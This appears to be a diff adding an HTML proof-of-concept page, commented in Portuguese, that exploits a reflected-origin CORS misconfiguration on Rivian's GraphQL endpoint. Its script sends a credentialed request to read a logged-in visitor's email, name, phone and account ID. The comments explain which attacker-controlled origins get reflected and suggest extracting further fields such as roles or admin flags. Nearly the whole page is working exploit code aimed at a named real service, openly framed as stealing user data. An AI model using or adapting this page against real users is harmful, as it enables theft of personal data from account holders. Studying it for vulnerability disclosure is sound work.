@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>Rivian CORS Data Exfiltration</title>
+</head>
+
+<body>
+  <h1>Aguarde... Roubando seus dados da Rivian.</h1>
+  <pre id="data"></pre>
+
+  <script>
+    // A URL do endpoint GraphQL vulnerável
+    const graphqlUrl = 'https://rivian.com/api/gql/gateway/graphql';
+
+    // A query GraphQL para extrair os dados do usuário
+    const query = `
+            {
+                currentUser {
+                    email
+                    id
+                    firstName
+                    lastName
+                    phone
+                    createdAt
+                    updatedAt
+                    // Você pode tentar outros campos aqui, como roles, isAdmin, etc.
+                    // Se você tiver um método para enumerar mais, adicione-os!
+                }
+            }
+        `;
+
+    // Configurações da requisição Fetch
+    // O 'Origin' DEVE ser um subdomínio do domínio alvo ou o domínio de um site que você controla
+    // que esteja configurado para receber o Access-Control-Allow-Origin refletido.
+    // No seu caso, 'https://rivian-com.free.beeceptor.com' é o que você usou e funcionou.
+    // Para um PoC real, você usaria um domínio que você controla (ex: https://seusite.com.br).
+    // A parte crucial é que o domínio que faz a requisição seja refletido no ACAO.
+    const options = {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        // Importante: O cabeçalho 'Origin' é automaticamente definido pelo navegador.
+        // Para o PoC, o importante é que o servidor da Rivian reflita *qualquer* Origin
+        // no ACAO, e que a requisição seja feita de um domínio que cause essa reflexão.
+        // Se você está hosteando este HTML em 'https://seusite.com.br', e o servidor Rivian
+        // retorna 'Access-Control-Allow-Origin: https://seusite.com.br', então funciona.
+        // Se ele só reflete o que você mandou na requisição Python (tipo "rivian-com.free.beeceptor.com"),
+        // você teria que hospedar o PoC nesse tipo de domínio ou encontrar outra falha.
+        // Pelo seu teste anterior, parece que ele reflete 'https://rivian.com.h2cqn', então um
+        // subdomínio de rivian.com (se você pudesse registrar um) ou um domínio com h2cqn no nome
+        // que não seja rivian.com, pode funcionar.
+        // O seu teste com 'https://rivian-com.free.beeceptor.com' já provou que esse tipo de
+        // nome funciona para reflexão.
+      },
+      body: JSON.stringify({ query: query }),
+      credentials: 'include' // ESSENCIAL para enviar os cookies de sessão
+    };
+
+    fetch(graphqlUrl, options)
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        return response.json();
+      })
+      .then(data => {
+        const dataDisplay = document.getElementById('data');
+        if (data && data.data && data.data.currentUser) {
+          dataDisplay.textContent = JSON.stringify(data.data.currentUser, null, 2);
+          alert('Dados do usuário Rivian roubados com sucesso! Verifique abaixo.');
+        } else {
+          dataDisplay.textContent = 'Nenhum dado do usuário encontrado ou erro na resposta.';
+          console.log('Resposta completa:', data);
+        }
+      })
+      .catch(error => {
+        console.error('Erro ao roubar dados:', error);
+        document.getElementById('data').textContent = 'Erro ao tentar roubar os dados: ' + error.message;
+      });
+  </script>
+</body>
+
+</html>
